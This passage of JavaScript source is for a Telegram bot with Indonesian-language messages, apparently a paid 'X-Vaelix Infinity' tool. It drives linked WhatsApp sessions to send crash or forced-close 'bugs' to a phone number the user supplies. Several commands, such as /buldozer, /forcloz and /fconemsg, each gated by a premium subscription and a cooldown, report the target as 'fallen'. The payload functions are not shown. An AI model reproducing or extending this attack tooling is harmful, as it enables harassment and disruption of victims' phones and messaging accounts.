      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://t.me/DarlinNyc", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Blank No Click
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Blank No Click
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/buldozer (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  let joined = await checkJoined(userId)

if (!joined) {
return sendJoinMessage(chatId)
}
  
    if (commandLocks["/buldozer"] === true) {
    return bot.sendMessage(chatId, "❌ Command /buldozer sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /buldozer`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://t.me/DarlinNyc", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Buldozer
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Buldozer
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/neyrx (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
    if (commandLocks["/neyrx"] === true) {
    return bot.sendMessage(chatId, "❌ Command /neyrx sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /neyrx`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://t.me/DarlinNyc", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Blank Notif X Force Click
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Blank Notif X Force Click
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/makloe (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
    if (commandLocks["/makloe"] === true) {
    return bot.sendMessage(chatId, "❌ Command /makloe sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /makloe`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://t.me/DarlinNyc", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Blank Notif
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Blank Notif
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/foreclx (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
    if (commandLocks["/foreclx"] === true) {
    return bot.sendMessage(chatId, "❌ Command /foreclx sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /foreclx`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://t.me/DarlinNyc", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Forclose X Delay
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Forclose X Delay
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/forexit (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
    if (commandLocks["/forexit"] === true) {
    return bot.sendMessage(chatId, "❌ Command /forexit sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /forexit`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://t.me/DarlinNyc", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Forclose
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Forclose
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/forcloz (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
    if (commandLocks["/forcloz"] === true) {
    return bot.sendMessage(chatId, "❌ Command /forcloz sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /forcloz`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://t.me/DarlinNyc", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Forclose Hard
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Forclose Hard
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/fconemsg (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
    if (commandLocks["/fconemsg"] === true) {
    return bot.sendMessage(chatId, "❌ Command /fconemsg sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /fconemsg`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

